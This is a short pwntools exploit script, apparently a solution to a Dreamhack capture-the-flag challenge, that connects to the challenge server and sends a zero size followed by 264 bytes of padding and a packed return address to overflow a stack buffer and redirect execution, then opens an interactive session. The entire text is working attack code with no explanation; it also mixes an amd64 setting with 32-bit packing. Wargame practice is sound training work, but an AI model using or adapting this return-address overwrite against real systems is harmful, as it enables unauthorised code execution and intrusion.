from pwn import *
context.log_level	= "DEBUG"
context.arch        = "amd64"

p = remote("host1.dreamhack.games", 16494)

sys = 0x08048659

payload_1st = b'0'          # First payload to input 0
payload_2nd = b'A' * 264    # 256 + 8
payload_2nd += p32(sys)

p.recvuntil("Size: ")
p.sendline(payload_1st)     # send 0

p.recvuntil("Data: ")
p.sendline(payload_2nd)     # send dummpy + ret address

p.interactive()
